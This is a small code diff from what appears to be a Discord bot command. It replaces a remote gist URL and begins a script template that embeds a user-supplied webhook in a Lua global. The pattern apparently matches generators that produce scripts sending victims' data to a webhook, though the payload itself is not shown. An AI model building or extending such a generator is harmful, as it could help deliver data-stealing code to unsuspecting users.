@@ -51,7 +51,7 @@ export async function execute(interaction) {
   const pingRole = submitted.fields.getTextInputValue('pingRole') || '';
 
   // ---- UPDATED GIST URL ----
-  const GIST_URL = "https://gist.githubusercontent.com/malik020859-ui/af8de2cfa2b03c8d143a0c4243e60dc2/raw/1141c2cb716328278e2290caaca6596e92734b1c/ANTIWARESS";
+  const GIST_URL = "https://gist.githubusercontent.com/malik020859-ui/f513af3ff4e17351ea21a0fae5dba45e/raw/e208f3d71830c12b021748cfe2ea3153be5c09fb/ANTIWARES2";
   
   const baseScript = `
 _G.YOUR_WEBHOOK = '${webhook}'
